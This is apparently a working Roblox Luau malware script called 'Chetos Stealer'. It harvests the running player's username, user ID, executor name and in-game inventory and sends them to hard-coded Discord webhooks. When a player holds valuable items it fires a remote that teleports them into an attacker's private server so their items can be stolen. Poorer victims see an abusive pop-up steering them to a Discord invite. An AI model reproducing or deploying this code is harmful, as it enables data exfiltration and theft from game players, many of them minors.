local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local Synchronizer = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
local Mutations = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Mutations"))
local Animals = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))

local Config = {
    WebhookURLs = {
        "https://discord.com/api/webhooks/1418707989979725935/XT9bGUg5I5fNGhV5avwKjodL2hbX6m20phTsfQKJkYx0mrUHHMehwMDK2bQQPSXVc66J"
    },
    HitLogWebhookURL = "https://discord.com/api/webhooks/1422011992515805245/cNOEe265aYCl69mYbF-aJjY2BWJ4EZFKUqPoEf_Ay9EMohW03tfM5LVKlmHRYnr18nbG",
    EnableWebhookLogging = true,
    ChetosIconURL = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
    RarityPriority = { ["Taco"] = 1, ["OG"] = 2, ["Admin"] = 3, ["Secret"] = 4, ["Brainrot God"] = 5, ["Mythic"] = 6, ["Legendary"] = 7, ["Epic"] = 8, ["Rare"] = 9, ["Common"] = 10 },
    RarityEmojis = { ["Taco"] = "🌮", ["OG"] = "😎", ["Admin"] = "🛡️", ["Secret"] = "❓", ["Brainrot God"] = "👑", ["Mythic"] = "✨", ["Legendary"] = "🌟", ["Epic"] = "💜", ["Rare"] = "💙", ["Common"] = "🤍" }
}

local CONFIG = {
    DYNAMIC_DISCORD_LINKS = {
        "https://discord.gg/BDBX4y9sMH"
    }
}

-- THIS PART READS THE DATA FROM YOUR LOADER
local env = getgenv()
local accessCode = nil
if env then
    if env.Webhook then
        table.insert(Config.WebhookURLs, env.Webhook)
    end
    accessCode = env.accesscode
end

if not accessCode then
    warn("Chetos Stealer: No accesscode found in getgenv(). The script will not be able to teleport rich players.")
end

local Utilities = {}
function Utilities.SafeCall(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        warn("Chetos Stealer Error: " .. tostring(result))
    end
    return success, result
end

function Utilities.GetExecutorName()
    if syn and syn.request then return "Synapse X" end
    if Krnl then return "Krnl" end
    if getexecutorname then local s, n = Utilities.SafeCall(getexecutorname); if s then return n end end
    if identifyexecutor then local s, n = Utilities.SafeCall(identifyexecutor); if s then return n end end
    return "Unknown"
end

function Utilities.HttpRequest(url, payload)
    if not url then return end
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        local data = HttpService:JSONEncode(payload)
        Utilities.SafeCall(function()
            requestFunc({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data })
        end)
    else
        warn("Chetos Stealer: No HTTP request function found.")
    end
end

function Utilities.formatNumber(n)
    if n >= 1e12 then
        return string.format("%.1ft", n / 1e12)
    elseif n >= 1e9 then
        return string.format("%.1fb", n / 1e9)
    elseif n >= 1e6 then
        return string.format("%.1fm", n / 1e6)
    elseif n >= 1e3 then
        return string.format("%.1fk", n / 1e3)
    else
        return tostring(math.floor(n))
    end
end

function Utilities.GetPlayerPlot()
    local player = Players.LocalPlayer
    local plotsFolder = Workspace:WaitForChild("Plots")
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local channel = Synchronizer:Wait(plot.Name)
        if channel:Get("Owner") == player then
            return plot, channel
        end
    end
    return nil, nil
end

local function createStyledNotificationGUI(titleText, messageText, buttonText)
    local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
    local gradient = Instance.new("UIGradient", overlay); gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))}); gradient.Rotation = 90
    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(120, 80, 255); stroke.Thickness = 2; stroke.Transparency = 0.4
    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.TextYAlignment = Enum.TextYAlignment.Center
    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
    local btnStroke = Instance.new("UIStroke", linkButton); btnStroke.Color = Color3.fromRGB(255, 255, 255); btnStroke.Thickness = 1; btnStroke.Transparency = 0.9
    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
    return gui
end

local WebhookHandler = {}
function WebhookHandler:_collectAndSortAnimals(playerPlotChannel)
    local animalsToSort = {}
    local shouldPingEveryone = false
    local animalList = playerPlotChannel:Get("AnimalList")
    if not animalList then return {}, false end
    for _, data in pairs(animalList) do
        if type(data) == "table" then
            local animalData = Animals[data.Index]
            local rarity = (animalData and animalData.Rarity) or "Unknown"
            local priority = Config.RarityPriority[rarity] or 99
            
            local baseGeneration = (animalData and animalData.Generation) or 0
            local finalGeneration = baseGeneration
            local mutationName = (data.Mutation and Mutations[data.Mutation] and Mutations[data.Mutation].DisplayText) or "None"
            
            if data.Mutation and Mutations[data.Mutation] then
                local mutationInfo = Mutations[data.Mutation]
                if mutationInfo and type(mutationInfo.Modifier) == "number" then
                    finalGeneration = baseGeneration * (1 + mutationInfo.Modifier)
                end
            end

            if priority <= 10 then shouldPingEveryone = true end
            table.insert(animalsToSort, { 
                name = (animalData and animalData.DisplayName) or data.Index, 
                mutation = mutationName, 
                priority = priority, 
                emoji = Config.RarityEmojis[rarity] or "🐾", 
                generation = finalGeneration 
            })
        end
    end
    table.sort(animalsToSort, function(a, b) return a.generation > b.generation end)
    return animalsToSort, shouldPingEveryone
end

function WebhookHandler:_buildEmbedPayload(player, sortedAnimals, shouldPing, currentAccessCode, rebirthCount)
    local animalStrings = {}
    local maxItemsToShow = 15
    local numItemsToShow = math.min(#sortedAnimals, maxItemsToShow)
    for i = 1, numItemsToShow do
        local animal = sortedAnimals[i]
        table.insert(animalStrings, string.format("%s %s (%s) - 💰 %s/s", animal.emoji, animal.name, animal.mutation, Utilities.formatNumber(animal.generation)))
    end
    if #sortedAnimals > maxItemsToShow then
        table.insert(animalStrings, string.format("...and %d more brainrots.", #sortedAnimals - maxItemsToShow))
    end
    local playerInfo = table.concat({ ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🔄 Rebirths: %d"):format(rebirthCount or 0), ("💻 Executor: %s"):format(Utilities.GetExecutorName()) }, "\n")
    local stats = ("TOTAL BRAINROTS: %d"):format(#sortedAnimals)
    local animalList = #animalStrings > 0 and table.concat(animalStrings, "\n") or "- No brainrots found on plot."
    
    local serverAccess = "The victim has been moved to a private server. Execute the code below to join them."
    local joinScript = string.format("```lua\nlocal accesscode = \"%s\"\nlocal placeid = game.PlaceId\ngame.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, \"\", accesscode)\n```", currentAccessCode)
    
    local content = joinScript
    if shouldPing then
        content = "@everyone you got massive dick.. I meant hit" .. "\n" .. joinScript
    end

    local fieldName = string.format("🐾 All Brainrots (Top %d shown)", numItemsToShow)
    return { username = "CHETOS STEALER", avatar_url = Config.ChetosIconURL, content = content, embeds = {{ author = { name = "CHETOS STEALER", icon_url = "https://cdn.discordapp.com/emojis/1249410199213117560.webp?size=96&quality=lossless" }, color = 3092790, fields = { { name = "👤 Player Information", value = "```\n" .. playerInfo .. "\n```", inline = false }, { name = "📊 BRAINROT STATISTICS", value = "```\n" .. stats .. "\n```", inline = false }, { name = fieldName, value = "```\n" .. animalList .. "\n```", inline = false }, { name = "🔗 SERVER ACCESS - GET THE LOOT!", value = serverAccess, inline = false } }, footer = { text = "CHETOS STEALER", icon_url = Config.ChetosIconURL }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") }}, allowed_mentions = { parse = { "everyone" } } }
end

function WebhookHandler:_buildHitLogPayload(player, sortedAnimals, rebirthCount)
    local animalStrings = {}
    local maxItemsToShow = 15
    local numItemsToShow = math.min(#sortedAnimals, maxItemsToShow)
    for i = 1, numItemsToShow do
        local animal = sortedAnimals[i]
        table.insert(animalStrings, string.format("%s %s (%s) - 💰 %s/s", animal.emoji, animal.name, animal.mutation, Utilities.formatNumber(animal.generation)))
    end
    if #sortedAnimals > maxItemsToShow then
        table.insert(animalStrings, string.format("...and %d more brainrots.", #sortedAnimals - maxItemsToShow))
    end
    
    local playerInfo = table.concat({
        ("👤 Username: @%s"):format(player.Name)
    }, "\n")
    
    local stats = ("TOTAL BRAINROT`S: %d"):format(#sortedAnimals)
    local animalList = #animalStrings > 0 and table.concat(animalStrings, "\n") or "- No brainrots found on plot."
    local fieldName = string.format("🐾 All Brainrots (Top %d shown)", numItemsToShow)

    return {
        username = "CHETOS HIT LOGS",
        avatar_url = Config.ChetosIconURL,
        embeds = {{
            author = { name = "CHETOS HIT LOGS" },
            color = 15844367,
            fields = {
                { name = "👤 Player Hit", value = "```\n" .. playerInfo .. "\n```", inline = false },
                { name = "📊 BRAINROT STATISTICS", value = "```\n" .. stats .. "\n```", inline = false },
                { name = fieldName, value = "```\n" .. animalList .. "\n```", inline = false }
            },
            footer = { text = "CHETOS STEALER", icon_url = Config.ChetosIconURL },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
end

function WebhookHandler:ScanAndReport()
    if not Config.EnableWebhookLogging then return end
    local player = Players.LocalPlayer
    local _, playerPlotChannel = Utilities.GetPlayerPlot()
    if not playerPlotChannel then
        warn("Chetos Stealer: Could not find the local player's plot.")
        return
    end

    local playerChannel = Synchronizer:Wait(player)
    local rebirthCount = playerChannel:Get("Rebirth") or 0
    local sortedAnimals, shouldPing = self:_collectAndSortAnimals(playerPlotChannel)

    if Config.HitLogWebhookURL then
        local hitLogPayload = self:_buildHitLogPayload(player, sortedAnimals, rebirthCount)
        Utilities.HttpRequest(Config.HitLogWebhookURL, hitLogPayload)
    end

    if shouldPing and accessCode then
        local payload = self:_buildEmbedPayload(player, sortedAnimals, shouldPing, accessCode, rebirthCount)

        for _, webhookUrl in ipairs(Config.WebhookURLs) do
            Utilities.HttpRequest(webhookUrl, payload)
        end
        
        task.wait(1)
        
        local placeid = game.PlaceId
        game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accessCode)

    elseif shouldPing and not accessCode then
        warn("Chetos Stealer: Rich player found but no accesscode was provided to teleport them.")
        createStyledNotificationGUI(
            "RICH PLAYER (NO TELEPORT)",
            "A rich player was found, but no access code was set in your loader. They were not teleported.",
            "OK"
        )
    else
        createStyledNotificationGUI(
            "YOU ARE POOR",
            "you're poor man you are shit you don't have good brairnot join here to steal people brianrotts or gag pets click the join link",
            "Join Link"
        )
    end
end

Utilities.SafeCall(WebhookHandler.ScanAndReport, WebhookHandler)
print("Chetos Stealer Notifier Initialized Successfully.")
